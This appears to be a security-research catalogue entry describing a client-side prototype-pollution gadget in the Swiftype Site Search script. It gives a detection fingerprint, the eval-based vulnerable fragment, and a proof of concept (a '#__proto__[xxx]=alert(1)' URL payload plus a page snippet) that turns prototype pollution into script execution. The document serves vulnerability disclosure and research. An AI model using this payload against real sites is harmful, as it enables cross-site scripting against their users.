## Swiftype Site Search (uses jQuery BBQ)

URL: https://swiftype.com/documentation/site-search/crawler-quick-start

### JS Fingerprint
```
return (typeof SwiftypeObject != 'undefined')
```

### Vulnerable code fragment

https://s.swiftypecdn.com/install/v2/st.js

```js
pInstall._convertStringHooksToFunctions = function() {
  var functionHooks = {};
  $.each(this._userServerConfiguration.install.hooks, function(hookName, hookFunction) {
    functionHooks[hookName] = eval(hookFunction)
  }),
  this._userServerConfiguration.install.hooks = functionHooks
}   
```

### PoC
```
#__proto__[xxx]=alert(1)
```

```html
<script>
  Object.prototype['xxx'] = 'alert(1)'
</script>

<script data-cookieconsent=ignore>
(function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
(w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
})(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
_st('install','xxxxxxxxxxxxxxxxxxxx','2.0.0');
</script>
```